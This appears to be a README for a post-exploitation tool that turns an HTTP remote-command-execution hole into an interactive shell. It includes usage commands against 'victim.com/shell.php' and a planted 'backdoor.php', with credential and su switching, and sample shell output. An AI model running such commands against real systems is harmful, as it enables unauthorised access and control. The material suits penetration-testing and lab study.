# Http Remote Shell

## Introduction

This tool gives a basic command line interface of an exploited HTTP RCE.
This might be useful if no bind-shell, nor reverse-shell can be setup.

> [The tool spawns a TTY shell with `/usr/bin/script` to correct the error: `su: must be run from terminal`](https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal)

## Usage

```bash
$ python3 ./http_rce.py -h
$ python3 ./http_rce.py --url 'http://victim.com/shell.php?cmd=MY_RCE_CMD&foo=bar' --http-method GET --headers '{"Cookie": "admin", "Host": "127.0.0.1"}'
$ python3 ./http_rce.py --url 'http://victim.com/shell.php?cmd=MY_RCE_CMD&foo=bar' --http-method GET --username '<USER>' --password '<PASS>'
$ python3 ./http_rce.py --url 'http://victim.com/shell.php?cmd=MY_RCE_CMD&foo=bar' --http-method GET --username '<USER>' --password '<PASS>' --regex 'Password: (.*), plz dont share it' --proxy 127.0.0.1:8080
$ python3 ./http_rce.py --url 'http://victim.com/shell.php?foo=bar' --http-method POST --data '{"cmd": "MY_RCE_CMD", "admin": "true"}' --username '<USER>' --password '<PASS>'
```

The RCE's placeholder in the request MUST be `MY_RCE_CMD`.

## Examples

Running as default user (e.g. `www-data`):
```bash
$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?c=MY_RCE_CMD' --http-method GET
bash > whoami
www-data

bash > ls
assets
css
index.php
js

bash >
```

Running as another user (e.g. `foo`):
```bash
$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?cmd=MY_RCE_CMD&foo1=bar2' --http-method GET --username 'foo' --password 'bar123'
bash > whoami
foo

bash > ls
assets css index.php js

bash >
```
